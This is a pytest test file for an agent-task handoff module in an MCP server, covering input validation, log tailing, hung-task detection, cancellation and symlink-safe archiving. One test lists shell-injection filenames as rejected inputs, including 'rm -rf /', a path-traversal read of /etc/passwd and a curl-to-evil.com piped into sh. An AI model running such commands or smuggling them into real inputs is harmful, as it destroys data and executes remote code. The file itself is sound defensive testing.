"""Tests for Agent Handoff v2 — agent_tasks module."""

from __future__ import annotations

import json
import os
import subprocess

import pytest

from examples.mcp_server.agent_tasks import (
    archive_agent_task,
    build_current_plan,
    build_initial_status,
    build_task_json,
    cancel_agent_task,
    inspect_agent_task,
    list_agent_tasks,
    read_agent_log_tail,
    read_agent_task_file,
    validate_base_ref,
    validate_filename,
    validate_required_checks,
    validate_scope_contract,
    validate_task_id,
    write_agent_task,
)


class TestValidateTaskId:
    def test_valid_ids(self):
        for tid in [
            "2026-06-24-stage-12-15a-rag-search-chunks-opencode",
            "a12345678901",
            "fix-test-flake-auth-mimo",
        ]:
            validate_task_id(tid)

    def test_invalid_ids(self):
        for tid in ["", "too-short", "UPPERCASE", "has spaces", "ä", None]:
            with pytest.raises((ValueError, TypeError)):
                validate_task_id(tid)  # type: ignore[arg-type]


class TestValidateBaseRef:
    SHA1 = "a" * 40
    SHA256 = "b" * 64

    def test_none_and_empty_accepted(self):
        validate_base_ref(None)
        validate_base_ref("")

    def test_full_40_hex_accepted(self):
        validate_base_ref(self.SHA1)

    def test_full_64_hex_accepted(self):
        validate_base_ref(self.SHA256)

    def test_mixed_case_full_hex_accepted(self):
        validate_base_ref("A" * 40)
        validate_base_ref("aBcDeF" * 6 + "aBcD")

    def test_rejects_short_or_partial_hex(self):
        for bad in ["a" * 39, "a" * 41, "b" * 63, "b" * 65]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_non_hex(self):
        for bad in ["g" * 40, "a" * 39 + "x", "z" * 64]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_refs_and_fragments(self):
        for bad in ["HEAD", "main", "main~1", "origin/main", "a" * 7]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_non_string(self):
        with pytest.raises(TypeError):
            validate_base_ref(123)  # type: ignore[arg-type]

    def test_build_task_json_rejects_invalid_base_ref(self):
        with pytest.raises(ValueError):
            build_task_json(task_id="a12345678901", agent="opencode", base_ref="main")


class TestValidateRequiredChecks:
    def test_rejects_acceptance_prose_with_clear_message(self):
        prose = [
            "No file modifications; report findings only.",
            "Run targeted tests and Ruff for changed files.",
        ]
        for entry in prose:
            with pytest.raises(ValueError) as exc_info:
                validate_required_checks([entry])
            assert "looks like acceptance prose" in str(exc_info.value)
            assert "acceptance_criteria" in str(exc_info.value)

    def test_accepts_legitimate_commands(self):
        legit = [
            "tox -q",
            "poetry run pytest -q",
            "uv run pytest -q",
            "FOO=1 BAR=2 pytest -q",
            "PYTHONPATH=. .venv/bin/python -m pytest tests -q",
            "./scripts/check.sh",
            "pytest -q",
            "ruff check",
            "pytest tests/test_agent_tasks.py tests/test_agent_paths.py -q",
            "pytest && ruff check tests/",
            "ruff check . && pytest -q | tee pytest.log",
            "git add .",
            "make check",
        ]
        for entry in legit:
            validate_required_checks([entry])

    def test_rejects_non_string_and_empty_entries(self):
        for bad in [None, "", "   ", "   \n\t", 42, ["nested"]]:
            with pytest.raises((TypeError, ValueError)):
                validate_required_checks([bad])  # type: ignore[list-item]

    def test_rejects_invalid_shell_syntax(self):
        for bad in ["pytest 'unterminated", "ruff check &&", "pytest |", "tox >"]:
            with pytest.raises(ValueError):
                validate_required_checks([bad])

    def test_rejects_non_list_input(self):
        with pytest.raises(TypeError):
            validate_required_checks("pytest -q")  # type: ignore[arg-type]

    def test_accepts_none_and_empty_list(self):
        validate_required_checks(None)
        validate_required_checks([])

    def test_build_task_json_rejects_prose(self):
        with pytest.raises(ValueError) as exc_info:
            build_task_json(
                task_id="a12345678901",
                agent="opencode",
                required_checks=["No file modifications; report findings only."],
            )
        assert "acceptance_criteria" in str(exc_info.value)

    def test_build_current_plan_rejects_prose(self):
        with pytest.raises(ValueError):
            build_current_plan(
                task_id="a12345678901",
                task="Fix tests",
                required_checks=["Run targeted tests and Ruff for changed files."],
            )

    def test_acceptance_criteria_remains_unrestricted(self):
        result = build_current_plan(
            task_id="a12345678901",
            task="Fix tests",
            acceptance_criteria=["No file modifications; report findings only."],
        )
        assert "No file modifications; report findings only." in result


class TestValidateScopeContract:
    def test_rejects_global_forbidden_with_nonempty_allowlist(self):
        for pattern in ["*", "**", "**/*"]:
            with pytest.raises(ValueError):
                validate_scope_contract(["app/**"], [pattern])

    def test_rejects_exact_overlap(self):
        with pytest.raises(ValueError):
            validate_scope_contract(["app/routers/jobs.py"], ["app/routers/jobs.py"])

    def test_accepts_nonconflicting_scope(self):
        validate_scope_contract(["app/**", "tests/**"], ["migrations/**"])

    def test_build_task_json_rejects_contradictory_scope(self):
        with pytest.raises(ValueError):
            build_task_json(
                task_id="a12345678901",
                agent="opencode",
                allowed_files=["app/routers/jobs.py"],
                forbidden_files=["**/*"],
            )


class TestBuildTaskJson:
    def test_minimal(self):
        result = build_task_json(task_id="a12345678901", agent="opencode")
        data = json.loads(result)
        assert data["task_id"] == "a12345678901"
        assert data["agent"] == "opencode"
        assert data["allowed_backends"] == ["opencode"]
        assert data["allowed_files"] == []
        assert data["commit_allowed"] is False
        assert "created" in data

    def test_minimal_base_ref_defaults_to_empty_string(self):
        data = json.loads(build_task_json(task_id="a12345678901", agent="opencode"))
        assert data["base_ref"] == ""

    def test_full(self):
        result = build_task_json(
            task_id="b23456789012",
            agent="opencode",
            allowed_files=["src/**", "tests/**"],
            forbidden_files=["migrations/**"],
            required_checks=["pytest -q", "ruff check"],
            worktree_path="../agent-worktrees/task-b",
            commit_allowed=False,
            push_allowed=False,
        )
        data = json.loads(result)
        assert data["agent"] == "opencode"
        assert data["allowed_backends"] == ["opencode"]
        assert "src/**" in data["allowed_files"]
        assert data["required_checks"] == ["pytest -q", "ruff check"]

    def test_accepts_base_ref(self):
        sha = "c" * 40
        data = json.loads(build_task_json(task_id="b23456789012", agent="opencode", base_ref=sha))
        assert data["base_ref"] == sha

    def test_accepts_64_hex_base_ref(self):
        sha = "d" * 64
        data = json.loads(build_task_json(task_id="b23456789012", agent="opencode", base_ref=sha))
        assert data["base_ref"] == sha


class TestWriteAgentTask:
    def _fake_run_cmd(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "ok", "stderr": "", "exit_code": 0}

        return fake_run_cmd, calls

    @staticmethod
    def _decoded_payload(script: str, filename: str) -> str:
        import base64

        line = next(line for line in script.splitlines() if line.endswith(f"/{filename}"))
        encoded = line.split("printf %s ", 1)[1].split(" | base64 -d", 1)[0]
        return base64.b64decode(encoded).decode("utf-8")

    def test_writes_base_ref_to_task_json_and_base_ref_txt(self):
        sha = "e" * 40
        fake_run_cmd, calls = self._fake_run_cmd()
        write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="Pin base ref", base_ref=sha)
        script = calls[0][1]
        contract = json.loads(self._decoded_payload(script, "task.json"))
        assert contract["base_ref"] == sha
        assert self._decoded_payload(script, "base-ref.txt") == sha

    def test_omitted_base_ref_stays_backward_compatible(self):
        fake_run_cmd, calls = self._fake_run_cmd()
        write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="No base ref")
        script = calls[0][1]
        contract = json.loads(self._decoded_payload(script, "task.json"))
        assert contract["base_ref"] == ""
        assert "base-ref.txt" not in script

    def test_invalid_base_ref_raises_before_script(self):
        fake_run_cmd, calls = self._fake_run_cmd()
        with pytest.raises(ValueError):
            write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="Bad base ref", base_ref="main")
        assert calls == []


class TestBuildInitialStatus:
    def test_created_status(self):
        result = build_initial_status(agent="opencode", task_id="a12345678901")
        assert "Status: created" in result
        assert "opencode" in result
        assert "a12345678901" in result

    def test_different_agent(self):
        result = build_initial_status(agent="custom-agent", task_id="b23456789012")
        assert "Status: created" in result
        assert "custom-agent" in result


class TestBuildCurrentPlan:
    def test_minimal(self):
        result = build_current_plan(task_id="c34567890123", task="Fix tests")
        assert "# Fix tests" in result
        assert "c34567890123" in result
        assert "implementation-diff.patch" in result
        assert "Do not commit or push" in result

    def test_full(self):
        result = build_current_plan(
            task_id="d45678901234",
            task="Add search chunks",
            scope="UI only",
            allowed_files=["father-ui/src/**"],
            forbidden_files=["app/**"],
            required_checks=["pytest -q"],
            acceptance_criteria=["Build passes", "Tests pass"],
            commit_message="polish: improve RAG search",
            constraints="No model changes",
        )
        assert "## Scope" in result
        assert "father-ui/src/**" in result
        assert "app/**" in result
        assert "polish: improve RAG search" in result
        assert "No model changes" in result


class TestReadAgentTaskFile:
    def test_returns_callable_result(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "file content", "stderr": "", "exit_code": 0}

        result = read_agent_task_file(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            filename="agent-status.md",
        )
        assert result["stdout"] == "file content"
        assert calls == [
            ("my-proj", "ls -ld -- .ai-bridge"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901/agent-status.md"),
            ("my-proj", "cat .ai-bridge/tasks/a12345678901/agent-status.md"),
        ]

    def test_rejects_shell_injection_in_filename(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "should never run", "stderr": "", "exit_code": 0}

        for malicious in [
            "x; rm -rf /",
            "x$(whoami)",
            "x`whoami`",
            "../../../etc/passwd",
            "x && curl evil.com | sh",
        ]:
            with pytest.raises(ValueError):
                read_agent_task_file(
                    fake_run_cmd,
                    project="my-proj",
                    task_id="a12345678901",
                    filename=malicious,
                )
        assert calls == []

    def test_accepts_safe_filenames(self):
        for name in ["agent-status.md", "agent-report.md", "implementation-diff.patch"]:
            validate_filename(name)


class TestReadAgentLogTail:
    def test_reads_fixed_bounded_log_and_tails_lines(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "one\ntwo\nthree\n", "stderr": "", "exit_code": 0}

        result = read_agent_log_tail(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            tail_lines=2,
        )

        assert result["stdout"] == "two\nthree\n"
        assert result["truncated"] is True
        assert calls == [
            ("my-proj", "ls -ld -- .ai-bridge"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901/opencode-output.log"),
            (
                "my-proj",
                "tail -c 65537 -- .ai-bridge/tasks/a12345678901/opencode-output.log",
            ),
        ]

    def test_strips_ansi_and_executor_owned_paths(self, monkeypatch):
        from examples.mcp_server.agent_paths import managed_workspace_path, task_dir

        monkeypatch.setenv("MCP_AGENT_STATE_ROOT", "/var/lib/mcp-agent/state")
        monkeypatch.setenv("MCP_AGENT_WORKSPACE_ROOT", "/var/lib/mcp-agent/workspaces")
        project = "my-proj"
        task_id = "a12345678901"
        td = task_dir(project, task_id)
        wt = managed_workspace_path(project, task_id)
        assert wt is not None

        result = read_agent_log_tail(
            lambda _p, _c: {
                "stdout": f"\x1b[0m→ Read {td}/current-plan.md\ncd {wt}\n",
                "stderr": "",
                "exit_code": 0,
            },
            project=project,
            task_id=task_id,
        )

        assert "\x1b" not in result["stdout"]
        assert "/var/lib/mcp-agent" not in result["stdout"]
        assert "<agent-task>/current-plan.md" in result["stdout"]

    def test_strips_executor_owned_paths_from_success_stderr(self, monkeypatch):
        from examples.mcp_server.agent_paths import task_dir

        monkeypatch.setenv("MCP_AGENT_STATE_ROOT", "/var/lib/mcp-agent/state")
        project = "my-proj"
        task_id = "a12345678901"
        td = task_dir(project, task_id)

        def fake_run(_project, command):
            if command.startswith("ls -ld -- "):
                return {
                    "stdout": "drwxr-xr-x 1 user user 0 path\n",
                    "stderr": "",
                    "exit_code": 0,
                }
            return {
                "stdout": "ok\n",
                "stderr": f"warning while reading {td}/opencode-output.log",
                "exit_code": 0,
            }

        result = read_agent_log_tail(
            fake_run,
            project=project,
            task_id=task_id,
        )

        assert "/var/lib/mcp-agent" not in result["stderr"]
        assert "<agent-task>/opencode-output.log" in result["stderr"]

    @pytest.mark.parametrize("tail_lines", [0, 1001, -1, True])
    def test_rejects_invalid_line_count_before_command(self, tail_lines):
        calls = []
        with pytest.raises((TypeError, ValueError)):
            read_agent_log_tail(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                tail_lines=tail_lines,
            )
        assert calls == []

    def test_missing_log_is_not_an_error(self):
        result = read_agent_log_tail(
            lambda _p, _c: {"stdout": "", "stderr": "missing", "exit_code": 1},
            project="my-proj",
            task_id="a12345678901",
        )
        assert result["stdout"] == "(not found)"
        assert result["exit_code"] == 0
        assert result["truncated"] is False


class TestInspectAgentTask:
    @staticmethod
    def _shell_runner(cwd):
        def run_cmd(_project: str, command: str) -> dict:
            result = subprocess.run(
                ["sh", "-c", command],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode,
            }

        return run_cmd

    def test_missing_task_returns_missing_verdict(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id="a12345678901",
        )
        assert result["exists"] is False
        assert result["verdict"] == "missing"
        assert result["likely_hung"] is False

    def test_running_job_with_old_artifacts_is_likely_hung(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nWorking\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("line 1\nline 2\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps(
                {"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"},
                sort_keys=True,
            ),
            encoding="utf-8",
        )
        old = 1_000
        for child in td.iterdir():
            os.utime(child, (old, old))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            tail_lines=1,
            stale_after_seconds=600,
            now_epoch=2_000,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["exists"] is True
        assert result["status"] == "running"
        assert result["job"]["status"] == "running"
        assert result["last_activity"]["age_seconds"] == 1_000
        assert result["verdict"] == "likely_hung"
        assert result["likely_hung"] is True
        assert result["log"]["stdout"] == "line 2\n"

    def test_terminal_status_is_finished_even_with_old_logs(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: needs-review\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("done\n", encoding="utf-8")
        for child in td.iterdir():
            os.utime(child, (1_000, 1_000))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=10_000,
        )

        assert result["verdict"] == "finished"
        assert result["terminal"] is True
        assert result["likely_hung"] is False

    def test_rejects_invalid_stale_threshold_before_commands(self):
        calls = []
        with pytest.raises(ValueError):
            inspect_agent_task(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                stale_after_seconds=59,
            )
        assert calls == []

    def test_running_startup_proxy_rotation_is_not_plain_running(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {
                    "stdout": (
                        "Status: running\n"
                        "Using exclusive live proxy from configured provider\n"
                        "OpenCode startup stalled; rotating proxy (attempt 3/4)\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {
                    "stdout": (
                        "Using exclusive live proxy from configured provider\n"
                        "OpenCode startup stalled; rotating proxy (attempt 2/4)\n"
                        "OpenCode startup stalled; rotating proxy (attempt 3/4)\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("stat -c "):
                if "agent-report.md" in command or "implementation-diff.patch" in command:
                    return {"stdout": "", "stderr": "not found", "exit_code": 1}
                return {"stdout": f"20 {now - 90}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["verdict"] == "startup_stalled"
        assert result["likely_hung"] is False
        assert result["startup"] == {
            "startup_timeout": False,
            "opencode_startup_stalled": True,
            "proxy_rotation": {"observed": True, "attempt": 3, "max_attempts": 4, "count": 3},
            "useful_agent_activity_seen": False,
            "dead_time_kind": "opencode_startup",
        }

    def test_startup_stall_with_useful_agent_work_remains_running(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: running\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {
                    "stdout": (
                        "OpenCode startup stalled; rotating proxy (attempt 1/4)\n"
                        "← Write agent-report.md\n"
                        "Wrote file successfully.\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("stat -c "):
                if "agent-report.md" in command or "implementation-diff.patch" in command:
                    return {"stdout": "", "stderr": "not found", "exit_code": 1}
                return {"stdout": f"20 {now - 30}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["verdict"] == "running"
        assert result["startup"]["opencode_startup_stalled"] is True
        assert result["startup"]["useful_agent_activity_seen"] is True
        assert result["startup"]["dead_time_kind"] is None

    def test_startup_timeout_status_is_terminal_and_classified(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: startup-timeout\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {"stdout": "Failure reason: opencode-startup-timeout\n", "stderr": "", "exit_code": 0}
            if command.startswith("stat -c "):
                return {"stdout": f"20 {now - 700}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
        )

        assert result["terminal"] is True
        assert result["verdict"] == "finished"
        assert result["startup"]["startup_timeout"] is True


class TestInspectAgentHeartbeat:
    def test_fresh_runner_heartbeat_does_not_mask_stale_progress(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: running\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat ") and "agent-heartbeat.json" in command:
                return {
                    "stdout": json.dumps({
                        "version": 1,
                        "state": "running",
                        "phase": "loop",
                        "updated_at": "2026-09-02T00:00:00Z",
                        "updated_epoch": now - 5,
                        "runner_pid": 123,
                        "exit_code": None,
                    }),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {"stdout": "still waiting\n", "stderr": "", "exit_code": 0}
            if command.startswith("stat -c "):
                if "agent-heartbeat.json" in command:
                    return {"stdout": f"120 {now - 5}\n", "stderr": "", "exit_code": 0}
                return {"stdout": f"20 {now - 700}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["runner_heartbeat_fresh"] is True
        assert result["runner_heartbeat"]["state"] == "running"
        assert result["last_activity"]["source"] != "heartbeat"
        assert result["likely_hung"] is True
        assert result["verdict"] == "likely_hung"

    def test_finished_runner_heartbeat_is_returned(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: needs-review\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-heartbeat.json" in command:
                return {
                    "stdout": json.dumps({
                        "version": 1,
                        "state": "finished",
                        "phase": "final",
                        "updated_at": "2026-09-02T00:00:00Z",
                        "updated_epoch": now - 1,
                        "runner_pid": 123,
                        "exit_code": 0,
                    }),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {"stdout": "done\n", "stderr": "", "exit_code": 0}
            if command.startswith("stat -c "):
                return {"stdout": f"20 {now - 1}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            now_epoch=now,
        )

        assert result["terminal"] is True
        assert result["verdict"] == "finished"
        assert result["runner_heartbeat"]["state"] == "finished"
        assert result["runner_heartbeat"]["exit_code"] == 0
        assert result["runner_heartbeat_fresh"] is False


class TestCancelAgentTask:
    def test_cancels_bound_attempt_job(self):
        calls: list[str] = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append(command)
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            return {"stdout": "", "stderr": "not found", "exit_code": 1}

        result = cancel_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            cancel_job=lambda job_id: {"status": "cancelling", "job_id": job_id},
        )

        assert result["cancel_requested"] is True
        assert result["status"] == "cancelling"
        assert result["job_id"] == "job-1"
        assert result["diagnostics"]["inspect_agent_task"]["task_id"] == "a12345678901"
        assert any("attempt-state.json" in command for command in calls)

    def test_refuses_to_guess_job_without_attempt_state(self):
        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "", "stderr": "No such file or directory", "exit_code": 1}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = cancel_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            cancel_job=lambda _job: pytest.fail("must not cancel without job_id"),
        )

        assert result["status"] == "missing"
        assert result["cancel_requested"] is False

    def test_refuses_unsubmitted_attempt(self):
        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": None}),
                    "stderr": "",
                    "exit_code": 0,
                }
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = cancel_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            cancel_job=lambda _job: pytest.fail("must not cancel without job_id"),
        )

        assert result["status"] == "not-submitted"
        assert result["cancel_requested"] is False


class TestListAgentTasks:
    def test_passes_project_and_requests_newest_first(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "task-2\ntask-1", "stderr": "", "exit_code": 0}

        result = list_agent_tasks(fake_run_cmd, project="my-proj")
        assert calls == [
            ("my-proj", "ls -ld -- .ai-bridge"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks"),
            ("my-proj", "ls -1t .ai-bridge/tasks/"),
        ]
        assert result["stdout"] == "task-2\ntask-1"

    def test_marks_truncated_task_list(self):
        tasks = [f"task-{idx:02d}" for idx in range(55)]

        def fake_run_cmd(project: str, command: str) -> dict:
            return {"stdout": "\n".join(tasks), "stderr": "", "exit_code": 0}

        result = list_agent_tasks(fake_run_cmd, project="my-proj")
        lines = result["stdout"].splitlines()
        assert lines[:50] == tasks[:50]
        assert lines[50] == "(truncated: showing 50 of 55 tasks)"


class TestArchiveAgentTask:
    def test_passes_project_and_task_id(self):
        calls = []

        def fake_run_script(project: str, script: str) -> dict:
            calls.append((project, script))
            return {"stdout": "ok", "stderr": "", "exit_code": 0}

        result = archive_agent_task(fake_run_script, project="my-proj", task_id="a12345678901")
        assert result["stdout"] == "archived a12345678901"
        assert calls[0][0] == "my-proj"
        script = calls[0][1]
        assert "mv -T -- \"$src\" \"$dst\"" in script
        assert "mkdir -p \"$archive_dir\"" in script
        assert ".ai-bridge/tasks/a12345678901" in script
        assert ".ai-bridge/archive/a12345678901" in script

    @pytest.mark.parametrize(
        ("runner_exit", "expected"),
        [(44, "not found"), (46, "failed to archive"), (48, "already contains")],
    )
    def test_maps_script_failures_without_exposing_internal_paths(self, runner_exit, expected):
        result = archive_agent_task(
            lambda _p, _s: {
                "stdout": "/internal/state/path",
                "stderr": "/internal/state/path",
                "exit_code": runner_exit,
            },
            project="my-proj",
            task_id="a12345678901",
        )
        combined = f"{result['stdout']} {result['stderr']}"
        assert expected in combined
        assert "/internal/state/path" not in combined
        assert result["exit_code"] == 1

    def test_invalid_task_id_raises(self):
        with pytest.raises(ValueError):
            archive_agent_task(lambda p, c: {}, project="p", task_id="bad")

    @staticmethod
    def _shell_runner(cwd):
        def run_script(_project: str, script: str) -> dict:
            result = subprocess.run(
                ["sh", "-c", script],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode,
            }

        return run_script

    def test_source_symlink_fails_closed_without_touching_target(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        tasks = tmp_path / ".ai-bridge" / "tasks"
        tasks.mkdir(parents=True)
        outside = tmp_path / "outside-source"
        outside.mkdir()
        marker = outside / "marker.txt"
        marker.write_text("keep", encoding="utf-8")
        (tasks / task_id).symlink_to(outside, target_is_directory=True)

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert marker.read_text(encoding="utf-8") == "keep"
        assert (tasks / task_id).is_symlink()
        assert not (tmp_path / ".ai-bridge" / "archive" / task_id).exists()

    def test_archive_dir_symlink_fails_closed_without_external_write(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        (source / "marker.txt").write_text("source", encoding="utf-8")
        outside_archive = tmp_path / "outside-archive"
        outside_archive.mkdir()
        archive_link = tmp_path / ".ai-bridge" / "archive"
        archive_link.symlink_to(outside_archive, target_is_directory=True)

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert source.is_dir()
        assert not (outside_archive / task_id).exists()
        assert archive_link.is_symlink()

    def test_destination_symlink_fails_closed_without_overwrite(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        archive = tmp_path / ".ai-bridge" / "archive"
        archive.mkdir(parents=True)
        outside = tmp_path / "outside-destination"
        outside.mkdir()
        marker = outside / "marker.txt"
        marker.write_text("keep", encoding="utf-8")
        (archive / task_id).symlink_to(outside, target_is_directory=True)

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert source.is_dir()
